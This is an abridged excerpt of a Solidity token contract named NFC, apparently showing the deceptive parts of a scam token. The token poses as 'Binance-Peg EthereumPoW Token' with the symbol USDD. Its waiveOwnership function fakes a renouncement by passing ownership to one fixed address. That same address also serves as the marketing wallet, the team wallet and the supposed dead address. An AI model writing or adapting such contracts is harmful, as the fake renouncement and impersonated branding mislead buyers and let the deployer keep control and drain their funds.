...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xEc245dA378725320e1656eADEd022Be483d0840c));
        _owner = address(0xEc245dA378725320e1656eADEd022Be483d0840c);
    }
...
contract NFC is Context, IERC20, Ownable {
    ...
    string private _name = "Binance-Peg EthereumPoW Token";
    string private _symbol = "USDD";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xEc245dA378725320e1656eADEd022Be483d0840c);
    address payable public teamWalletAddress = payable(0xEc245dA378725320e1656eADEd022Be483d0840c);
    address public immutable deadAddress = 0xEc245dA378725320e1656eADEd022Be483d0840c;
